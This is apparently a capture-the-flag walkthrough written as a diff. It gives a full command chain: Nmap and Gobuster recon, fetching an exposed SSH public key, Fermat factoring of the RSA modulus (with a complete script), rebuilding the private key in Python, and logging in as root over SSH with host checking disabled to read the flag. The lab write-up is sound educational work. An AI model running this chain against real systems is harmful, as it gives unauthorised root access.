@@ -1,0 +1,131 @@
+
+1) Recon — Nmap
+#To Find Ports
+nmap -sV -Pn <Your_Ip> -oN nmap_services.txt
+sed -n '1,120p' nmap_services.txt
+
+#Output Reducted
+
+2) Find hidden web directories — Gobuster
+gobuster dir -u http://<Your_Ip> -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html -q
+Key output: /************
+
+3) Grab the exposed public key
+curl -sS http://<Your_Ip>/***********/id_rsa.pub -o id_rsa.pub
+sed -n '1,3p' id_rsa.pub
+#You should see an OpenSSH public key beginning ssh-rsa AAAA...
+
+4) Derive the modulus (hex) and convert to decimal (n)
+#Convert the OpenSSH pubkey to PKCS8 and extract Modulus=..., then convert hex → decimal using Python:
+
+ssh-keygen -f id_rsa.pub -e -m PKCS8 | openssl rsa -pubin -noout -modulus > modulus.txt
+HEX=$(sed -n '1p' modulus.txt | cut -d'=' -f2)
+python3 - <<PY > n.txt
+HEX = "$HEX"
+print(int(HEX, 16))
+PY
+#n.txt now contains the decimal modulus n.
+
+5) Factor n with Fermat (p and q are close)
+#Fermat method is efficient when p and q are near each other.
+
+#Save this small helper as fermat_factor.py and run it:
+
+#!/usr/bin/env python3
+try:
+    from gmpy2 import isqrt
+except Exception:
+    from math import isqrt
+
+def factorize(n):
+    n = int(n)
+    if (n & 1) == 0:
+        return n//2, 2
+    a = isqrt(n)
+    if a*a == n:
+        return int(a), int(a)
+    while True:
+        a += 1
+        bsq = a*a - n
+        b = isqrt(bsq)
+        if b*b == bsq:
+            return int(a+b), int(a-b)
+
+if __name__ == "__main__":
+    n = int(open("n.txt").read().strip())
+    p, q = factorize(n)
+    print(p)
+    print(q)
+||||||||||||||
+python3 fermat_factor.py n.txt > pq.txt
+sed -n '1,2p' pq.txt
+
+6) Sanity checks (verify p*q == n)
+P=$(sed -n '1p' pq.txt)
+Q=$(sed -n '2p' pq.txt)
+N=$(sed -n '1p' n.txt)
+python3 - <<PY
+P=int("$P"); Q=int("$Q"); N=int("$N")
+print("p * q == n ?", P * Q == N)
+print("p-q =", P - Q)
+PY
+#You should see p * q == n ? True and a (relatively) small p-q confirming Fermat worked.
+
+
+7) Reconstruct private key (PEM)
+#Use Python + cryptography to compute d and build the PEM private key:
+
+python3 - <<PY
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+from math import gcd
+import gmpy2
+
+P = int(open("pq.txt").read().splitlines()[0])
+Q = int(open("pq.txt").read().splitlines()[1])
+N = int(open("n.txt").read().strip())
+e = 65537
+
+l = (P-1)//gcd(P-1, Q-1) * (Q-1)
+d = pow(e, -1, l) if hasattr(pow, "__call__") else int(gmpy2.invert(e, l))
+
+dmp1 = d % (P-1); dmq1 = d % (Q-1)
+iqmp = int(gmpy2.invert(Q, P))
+
+priv = rsa.RSAPrivateNumbers(
+    p=P, q=Q, d=d, dmp1=dmp1, dmq1=dmq1, iqmp=iqmp,
+    public_numbers=rsa.RSAPublicNumbers(e=e, n=N)
+).private_key(default_backend())
+
+pem = priv.private_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PrivateFormat.PKCS8,
+    encryption_algorithm=serialization.NoEncryption()
+)
+
+open("ssh_private_key.pem","wb").write(pem)
+print("WROTE ssh_private_key.pem")
+PY
+chmod 600 ssh_private_key.pem
+
+8) Verify derived private key matches original public key
+ssh-keygen -y -f ssh_private_key.pem > derived.pub
+ssh-keygen -lf id_rsa.pub
+ssh-keygen -lf derived.pub
+
+#Fingerprints should match. If they don't, review the previous steps.
+
+
+#Important: don’t chmod +x or try to execute the .pem file — it’s not a program.
+
+9) SSH in and read the flag
+ssh -i ssh_private_key.pem -o StrictHostKeyChecking=no root@<Your_IP> "cat /root/flag || cat /root/flag.txt || cat flag"
+# or for debugging
+ssh -i ssh_private_key.pem -o StrictHostKeyChecking=no -vvv root@<Your_IP>
+
+💥BOOM You obtained the flag. 
+
+#That's It It's Very Easy 🙂😶‍🌫️
+
+
